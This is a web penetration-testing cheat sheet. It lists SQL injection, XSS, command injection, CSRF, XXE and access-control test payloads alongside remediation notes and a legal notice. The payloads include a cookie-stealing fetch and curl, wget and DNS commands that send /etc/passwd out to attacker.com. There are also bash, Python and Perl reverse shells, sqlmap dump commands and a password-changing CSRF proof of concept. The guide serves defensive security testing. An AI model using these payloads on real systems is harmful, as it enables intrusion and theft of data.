# Web Vulnerability Testing Guide

> Comprehensive reference for identifying and testing common web application vulnerabilities during security assessments.

---

## Table of Contents

1. [SQL Injection (SQLi)](#sql-injection-sqli)
2. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
3. [OS Command Injection](#os-command-injection)
4. [Cross-Site Request Forgery (CSRF)](#csrf)
5. [Authentication & Authorization](#authentication--authorization)
6. [Broken Access Control](#broken-access-control)
7. [Sensitive Data Exposure](#sensitive-data-exposure)
8. [XML External Entities (XXE)](#xxe)
9. [Broken Object Level Authorization (BOLA)](#bola)
10. [Security Testing Workflow](#workflow)

---

## SQL Injection (SQLi)

### Overview
SQL injection occurs when user input is directly concatenated into SQL queries without proper sanitization or parameterization, allowing attackers to manipulate database queries.

### Detection Methods

#### 1. **Basic Testing**
```bash
# Single quote injection
Input: ' OR '1'='1
Input: admin' --
Input: ' OR 1=1 --
Input: admin' OR '1'='1' --

# Numeric injection
Input: 1 OR 1=1
Input: 1 UNION SELECT NULL, NULL --
Input: 1 AND 1=2 UNION SELECT version() --
```

#### 2. **Time-Based Blind SQLi**
```bash
# MySQL/MariaDB
Input: 1' AND SLEEP(5) --
Input: 1' AND IF(1=1, SLEEP(5), 0) --

# SQL Server
Input: 1'; WAITFOR DELAY '00:00:05' --

# PostgreSQL
Input: 1' AND PG_SLEEP(5) --
```

#### 3. **Error-Based SQLi**
```bash
# Extract data through error messages
Input: 1' AND extractvalue(1, concat(0x7e, (SELECT version()))) --
Input: 1' AND updatexml(1, concat(0x7e, (SELECT user())), 1) --
```

#### 4. **Union-Based SQLi**
```bash
# Determine number of columns
Input: 1 ORDER BY 1 --
Input: 1 ORDER BY 2 --
Input: 1 ORDER BY 3 -- (continue until error)

# Extract data
Input: 1 UNION SELECT NULL, database(), version() --
Input: 1 UNION SELECT table_name, column_name, NULL FROM information_schema.columns --
```

#### 5. **Automated Testing**
```bash
# Using SQLMap
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump
sqlmap -r request.txt --batch --risk=3 --level=5
```

### Common Vulnerable Parameters
- Query strings: `?id=`, `?search=`, `?page=`
- POST fields: login forms, search boxes, filters
- HTTP headers: `User-Agent`, `X-Forwarded-For`, `Referer`
- Cookies: session tokens, tracking IDs
- APIs: JSON/XML payloads

### Remediation Indicators
- ✅ Parameterized queries/prepared statements
- ✅ Input validation and whitelisting
- ✅ Stored procedures with parameters
- ✅ Web Application Firewall (WAF) rules
- ✅ Least privilege database accounts

---

## Cross-Site Scripting (XSS)

### Overview
XSS allows attackers to inject malicious scripts into web pages viewed by other users, potentially stealing sessions, credentials, or performing unauthorized actions.

### Types

#### 1. **Stored (Persistent) XSS**
- Malicious script stored in database
- Affects all users who view the content
- Examples: Comments, forum posts, profile descriptions

#### 2. **Reflected XSS**
- Script reflected back in response
- Requires social engineering to trick users
- Examples: Search results, error messages, URL parameters

#### 3. **DOM-based XSS**
- Vulnerability in client-side JavaScript
- Script executed through DOM manipulation
- No server-side processing needed

### Detection Methods

#### 1. **Basic Testing Payloads**
```javascript
// Simple alert
<script>alert('XSS')</script>

// Image tag event handler
<img src=x onerror=alert('XSS')>

// SVG vector
<svg onload=alert('XSS')>

// Event handlers
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>

// Data exfiltration
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>
```

#### 2. **HTML Encoding Bypass**
```javascript
// HTML entities
&lt;script&gt;alert('XSS')&lt;/script&gt;

// Unicode encoding
\x3cscript\x3ealert('XSS')\x3c/script\x3e

// Base64 encoding
eval(atob('YWxlcnQoJ1hTUycpOw=='))

// HTML5 event handlers
<body onload=alert('XSS')>
<iframe onload=alert('XSS')>
```

#### 3. **Filter Evasion**
```javascript
// Case variation
<ScRiPt>alert('XSS')</sCrIpT>

// Space alternatives
<script%20>alert('XSS')</script>

// Newline injection
<script>
alert('XSS')</script>

// Tag nesting
<s<script>cript>alert('XSS')</script>

// Comment insertion
<script>/**/alert('XSS')</script>
```

#### 4. **Automated Testing**
```bash
# Using Burp Suite
# 1. Set up proxy
# 2. Use Scanner -> Active Scan
# 3. Check XSS vulnerabilities

# Using OWASP ZAP
zaproxy -cmd -quickurl http://target.com
```

### Common Vulnerable Parameters
- URL parameters: `?search=`, `?keyword=`
- Form fields: comments, user profiles, feedback
- HTTP headers: reflected in error pages
- API responses: user-controlled JSON data
- JavaScript context: innerHTML, eval(), document.write()

### Remediation Indicators
- ✅ HTML entity encoding (< > & " ')
- ✅ JavaScript escaping in script context
- ✅ URL encoding for URL parameters
- ✅ CSS encoding for style attributes
- ✅ Content Security Policy (CSP) headers
- ✅ Input validation and whitelisting
- ✅ HTTPOnly and Secure flags on cookies

---

## OS Command Injection

### Overview
Command injection occurs when user input is passed to system shell commands without proper sanitization, allowing attackers to execute arbitrary operating system commands.

### Detection Methods

#### 1. **Basic Testing Payloads**
```bash
# Command separators
; id
| id
|| id
& id
&& id
` id `
$( id )

# Command substitution
test`id`
test$(id)
test`whoami`
test$(whoami)
```

#### 2. **Time-Based Detection**
```bash
# Ping delay
; ping -c 5 127.0.0.1
; sleep 5

# Using nslookup
; nslookup attacker.com

# DNS exfiltration
; nslookup $(whoami).attacker.com
```

#### 3. **Data Exfiltration**
```bash
# Write to web root
; cp /etc/passwd /var/www/html/
; cat /etc/passwd > /tmp/output.txt

# HTTP exfiltration
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/?data=$(cat /etc/passwd | base64)

# DNS exfiltration
; nslookup $(cat /etc/passwd | base64).attacker.com
```

#### 4. **Reverse Shell**
```bash
# Bash reverse shell
; bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python reverse shell
; python -c 'import socket,subprocess;s=socket.socket();s.connect(("attacker.com",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

# Perl reverse shell
; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### 5. **Automated Testing**
```bash
# Manual testing with common commands
| whoami
| id
| uname -a
| cat /etc/passwd
| ls -la

# Using tools
commix --url="http://target.com/page.php?cmd=" --technique=1
```

### Common Vulnerable Parameters
- Ping utilities: `?host=`, `?ip=`
- Traceroute functions: `?target=`
- DNS lookup: `?domain=`
- System commands: `?filename=`
- Backup/restore: file paths in parameters

### Remediation Indicators
- ✅ Avoid shell execution (use APIs instead)
- ✅ Whitelist allowed commands/arguments
- ✅ Input validation and regex matching
- ✅ Run with minimal privileges
- ✅ Use parameterized APIs (Process.start with array)
- ✅ Disable dangerous functions (shell_exec, system, exec)

---

## CSRF (Cross-Site Request Forgery)

### Overview
CSRF forces authenticated users to perform unintended actions on vulnerable sites where they're logged in.

### Detection Methods

#### 1. **Check for CSRF Tokens**
```bash
# Look in form source
<input type="hidden" name="csrf_token" value="...">
<meta name="csrf-token" content="...">

# Check HTTP headers
X-CSRF-Token: ...
```

#### 2. **Testing Approach**
- Perform sensitive action while logged in
- Check if request requires CSRF token
- Verify token is:
  - Present in requests
  - Unique per session
  - Verified server-side
  - Cannot be predicted

#### 3. **Proof of Concept**
```html
<!-- Create CSRF PoC -->
<form action="http://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked">
  <input type="submit">
</form>
<script>
  document.forms[0].submit();
</script>
```

### Remediation Indicators
- ✅ CSRF tokens on all state-changing requests
- ✅ SameSite cookie attribute
- ✅ Verify Origin/Referer headers
- ✅ Custom request headers (X-Requested-With)

---

## Authentication & Authorization

### Common Vulnerabilities

#### 1. **Weak Password Policy**
```bash
# Test default credentials
admin:admin
admin:password
root:root
test:test

# Common patterns
123456, password123, qwerty, admin123
```

#### 2. **Session Management Issues**
- Predictable session IDs
- Session tokens in URLs
- Missing HTTPOnly/Secure flags
- Session fixation
- Insufficient timeout

#### 3. **Testing Methods**
```bash
# Cookie analysis
- Check cookie flags (HttpOnly, Secure, SameSite)
- Verify session expiration
- Test token reuse
- Check for session fixation

# JWT analysis
- Decode JWT tokens
- Check for signing issues
- Test token modification
- Verify expiration
```

#### 4. **Multi-Factor Authentication Bypass**
- OTP reuse
- Timing-based weaknesses
- Backup code enumeration
- Recovery mechanism bypass

### Remediation Indicators
- ✅ Strong password requirements
- ✅ Multi-factor authentication
- ✅ Secure session management
- ✅ Proper JWT signing
- ✅ Session timeout
- ✅ Password reset protection

---

## Broken Access Control

### Detection Methods

#### 1. **Horizontal Privilege Escalation**
```bash
# Access other users' data
GET /api/user/profile/123
GET /api/user/profile/124  (different user)

# Modify another user's data
POST /api/user/update/123 (modify user 124's data)
```

#### 2. **Vertical Privilege Escalation**
```bash
# Access admin functions as regular user
GET /admin/dashboard
GET /admin/users/list
POST /admin/user/delete/1
```

#### 3. **Path Traversal**
```bash
# Access restricted files
/profile/../admin
/files/document.pdf
/files/../../etc/passwd
/files/....//....//....//etc/passwd
```

#### 4. **Insecure Direct Object References (IDOR)**
```bash
# Sequential ID enumeration
/user/profile/1
/user/profile/2
/invoice/12345
/invoice/12346
```

### Testing Workflow
1. Map all endpoints and resources
2. Identify resource identifiers (IDs, names)
3. Test with different user accounts
4. Try accessing higher-privilege resources
5. Attempt to modify other users' resources

---

## Sensitive Data Exposure

### Detection Methods

#### 1. **Data in Transit**
```bash
# Check SSL/TLS
- Verify HTTPS on all pages
- Check certificate validity
- Test for SSL downgrade
- Verify strong ciphers

# Using tools
nmap --script ssl-enum-ciphers -p 443 target.com
testssl.sh https://target.com
```

#### 2. **Data at Rest**
```bash
# Check for unencrypted sensitive data
- Passwords in plain text
- API keys in code
- Credentials in comments
- Database backups unencrypted

# Search repositories
git log -S"password" --all
git log -S"api_key" --all
```

#### 3. **Exposed Endpoints**
```bash
# Common unprotected endpoints
/admin/backup/
/logs/
/config/
/.git/
/.env
/debug/

# API enumeration
/api/v1/users
/api/v1/debug
/api/admin/
```

### Remediation Indicators
- ✅ HTTPS everywhere
- ✅ Strong encryption (AES-256)
- ✅ Secure key management
- ✅ No sensitive data in logs
- ✅ Data classification
- ✅ PII protection

---

## XXE (XML External Entities)

### Detection Methods

#### 1. **Basic XXE Payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

#### 2. **XXE with External DTD**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>
<root>&xxe;</root>
```

#### 3. **Blind XXE (OOB)**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?file=">]>
<root>&xxe;</root>
```

#### 4. **Billion Laughs Attack**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

### Common Vulnerable Parameters
- XML file uploads
- SOAP requests
- PDF generation
- SVG uploads
- RSS feeds

---

## BOLA (Broken Object Level Authorization)

### Detection Methods

#### 1. **Enumeration**
```bash
# Sequential ID testing
GET /api/orders/1001
GET /api/orders/1002
GET /api/orders/1003

# Batch enumeration
for i in {1..100}; do
  curl -H "Authorization: Bearer $TOKEN" \
    "http://target.com/api/resource/$i"
done
```

#### 2. **Cross-User Testing**
```bash
# Get token from User A
# Access User B's resources
GET /api/user/B/data -H "Authorization: Bearer TokenA"

# Modify User B's data
POST /api/user/B/update -H "Authorization: Bearer TokenA"
```

#### 3. **API Testing**
```bash
# Test API endpoints
GET /api/v1/users/{id}/profile
GET /api/v1/invoices/{id}
GET /api/v1/documents/{id}

# Systematic testing
- Same user, different ID
- Different user, same ID
- Missing authentication
- Invalid tokens
```

---

## Workflow

### Step 1: Information Gathering
```bash
# Identify technology stack
- Check headers (Server, X-Powered-By)
- Analyze responses
- Review client-side code
- Check robots.txt, sitemap.xml
```

### Step 2: Enumeration
```bash
# Map application
- Document all endpoints
- Identify parameters
- Note data types
- Record response patterns
```

### Step 3: Vulnerability Testing
```bash
# Systematic testing
1. Authentication testing
2. Authorization testing
3. Input validation testing
4. Business logic testing
5. Session management testing
```

### Step 4: Exploitation
```bash
# Proof of concept
- Demonstrate impact
- Document steps
- Create reproducible PoC
- Maintain audit trail
```

### Step 5: Reporting
```bash
# Professional report
- Clear vulnerability description
- Step-by-step reproduction
- Risk assessment
- Remediation recommendations
- Evidence screenshots
```

---

## Testing Tools Integration

### Recommended Tools
```bash
# Web Testing
burpsuite-community          # Comprehensive web testing
owasp-zap                    # OWASP automated scanning
sqlmap                       # SQL injection testing
commix                       # Command injection testing
xsstrike                     # XSS detection

# Reconnaissance
curl / wget                  # Manual testing
nikto                        # Web server scanning
wpscan                       # WordPress scanning
nuclei                       # Template-based scanning

# Analysis
wireshark                    # Network analysis
postman                      # API testing
jq                          # JSON analysis
```

### Quick Testing Commands
```bash
# SQL Injection
sqlmap -u "http://target.com/page.php?id=1" --batch

# XSS Scanning
zaproxy -cmd -quickurl http://target.com

# Command Injection
commix --url="http://target.com/ping.php?host=" --technique=1

# OWASP Top 10 Scan
nikto -h target.com -p 80 -o report.html

# API fuzzing
nuclei -u http://target.com -templates nuclei-templates/
```

---

## Reference: OWASP Top 10 (2021)

| Rank | Vulnerability | CWE |
|------|----------------|-----|
| A01 | Broken Access Control | CWE-639 |
| A02 | Cryptographic Failures | CWE-327 |
| A03 | Injection | CWE-94 |
| A04 | Insecure Design | CWE-434 |
| A05 | Security Misconfiguration | CWE-16 |
| A06 | Vulnerable & Outdated Components | CWE-1035 |
| A07 | Authentication Failures | CWE-287 |
| A08 | Data Integrity Failures | CWE-345 |
| A09 | Logging & Monitoring Failures | CWE-778 |
| A10 | SSRF | CWE-918 |

---

## Quick Reference Cheatsheet

### Input Points to Test
- ✅ URL parameters
- ✅ POST data
- ✅ HTTP headers
- ✅ Cookies
- ✅ File uploads
- ✅ API JSON/XML bodies
- ✅ Hidden form fields

### Testing Principles
1. **Test everything** - Every input point is a potential vulnerability
2. **Think like an attacker** - What if I bypass validation?
3. **Automate where possible** - Use tools for repetitive scanning
4. **Manual verification** - Tools find issues, humans understand context
5. **Document findings** - Clear reproduction steps matter

---

## Legal & Ethical Notice

⚠️ **Authorization Required**
- Obtain written permission before any security testing
- Unauthorized testing is illegal
- Document all activities in audit trails
- Respect scope limitations
- Report findings responsibly

---

**Remember:** Thorough web vulnerability testing requires a combination of automated tools and manual expertise. The best results come from understanding both the technology and the attacker's mindset.
